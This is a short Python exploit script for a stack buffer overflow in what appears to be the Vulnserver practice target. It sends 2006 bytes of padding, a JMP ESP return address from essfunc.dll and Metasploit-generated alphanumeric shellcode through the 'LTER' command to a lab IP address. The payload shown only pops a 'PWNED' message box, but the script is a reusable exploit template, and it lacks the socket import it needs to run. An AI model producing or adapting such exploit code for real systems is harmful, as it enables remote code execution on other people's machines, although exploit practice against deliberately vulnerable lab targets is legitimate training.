#! /usr/bin/python

# msfpayload windows/messagebox title="PWNED" text="Pwned by D4v3" R | msfencode -b "\x00\x0a\x0d" -e x86/alpha_mixed -t c BufferRegister=ESP
#Using ESP register because the payload is reflected closest to this register
#Length: 574 bytes
shellcode=("\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x7a\x79\x58\x6b\x4d\x4b\x7a\x79"
"\x44\x34\x47\x54\x68\x74\x56\x51\x4b\x62\x4e\x52\x51\x67\x54"
"\x71\x79\x59\x45\x34\x4e\x6b\x42\x51\x46\x50\x4c\x4b\x34\x36"
"\x34\x4c\x6c\x4b\x70\x76\x65\x4c\x6c\x4b\x42\x66\x55\x58\x6c"
"\x4b\x73\x4e\x71\x30\x4e\x6b\x64\x76\x47\x48\x72\x6f\x72\x38"
"\x31\x65\x6a\x53\x51\x49\x45\x51\x5a\x71\x4b\x4f\x48\x61\x35"
"\x30\x6e\x6b\x52\x4c\x64\x64\x77\x54\x4c\x4b\x52\x65\x35\x6c"
"\x6e\x6b\x76\x34\x76\x48\x42\x58\x66\x61\x6b\x5a\x4c\x4b\x50"
"\x4a\x47\x68\x6e\x6b\x63\x6a\x51\x30\x57\x71\x6a\x4b\x4b\x53"
"\x46\x54\x63\x79\x4c\x4b\x70\x34\x6c\x4b\x76\x61\x6a\x4e\x46"
"\x51\x6b\x4f\x46\x51\x6b\x70\x79\x6c\x6c\x6c\x4c\x44\x4b\x70"
"\x30\x74\x66\x67\x6a\x61\x58\x4f\x34\x4d\x45\x51\x4b\x77\x4a"
"\x4b\x48\x74\x37\x4b\x73\x4c\x45\x74\x74\x68\x50\x75\x69\x71"
"\x4c\x4b\x42\x7a\x35\x74\x63\x31\x5a\x4b\x42\x46\x4e\x6b\x36"
"\x6c\x52\x6b\x6c\x4b\x31\x4a\x45\x4c\x76\x61\x38\x6b\x6c\x4b"
"\x33\x34\x6e\x6b\x55\x51\x4a\x48\x4b\x39\x32\x64\x67\x54\x37"
"\x6c\x30\x61\x6f\x33\x6c\x72\x56\x68\x66\x49\x6a\x74\x4d\x59"
"\x59\x75\x6b\x39\x5a\x62\x43\x58\x6e\x6e\x62\x6e\x56\x6e\x58"
"\x6c\x42\x72\x69\x78\x4f\x6f\x4b\x4f\x59\x6f\x6b\x4f\x6e\x69"
"\x63\x75\x33\x34\x4f\x4b\x53\x4e\x58\x58\x5a\x42\x42\x53\x4f"
"\x77\x47\x6c\x71\x34\x51\x42\x6d\x38\x6e\x6e\x39\x6f\x39\x6f"
"\x59\x6f\x6d\x59\x50\x45\x45\x58\x55\x38\x30\x6c\x70\x6c\x45"
"\x70\x31\x51\x32\x48\x45\x63\x30\x32\x54\x6e\x43\x54\x71\x78"
"\x30\x75\x63\x43\x71\x75\x31\x62\x6e\x68\x31\x4c\x76\x44\x35"
"\x5a\x4b\x39\x78\x66\x42\x76\x49\x6f\x52\x75\x66\x64\x4f\x79"
"\x78\x42\x30\x50\x6f\x4b\x79\x38\x4f\x52\x32\x6d\x6f\x4c\x4e"
"\x67\x45\x4c\x75\x74\x51\x42\x6b\x58\x45\x31\x79\x6f\x6b\x4f"
"\x4b\x4f\x62\x48\x61\x54\x50\x58\x71\x30\x37\x50\x61\x78\x36"
"\x30\x53\x67\x50\x4e\x30\x45\x36\x51\x59\x4b\x4d\x58\x33\x6c"
"\x75\x74\x57\x75\x6e\x69\x4a\x43\x43\x58\x74\x73\x30\x58\x55"
"\x70\x77\x50\x65\x38\x57\x50\x37\x34\x47\x44\x30\x76\x65\x38"
"\x52\x44\x75\x70\x50\x62\x51\x69\x65\x38\x70\x50\x30\x77\x70"
"\x6e\x53\x55\x55\x61\x4b\x79\x4b\x38\x72\x6c\x61\x34\x44\x4d"
"\x4c\x49\x78\x61\x75\x61\x48\x52\x43\x62\x30\x53\x50\x51\x71"
"\x42\x69\x6f\x5a\x70\x64\x71\x49\x50\x32\x70\x4b\x4f\x52\x75"
"\x34\x48\x41\x41")

buffer="A"* 2006			
buffer+="\x03\x12\x50\x62"	#0x62501203 jmp esp | essfunc.dll because after 7F all are bad chars
buffer+=shellcode

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.56.101',9999))

payload=buffer

s.send('LTER .'+ payload)
s.close()
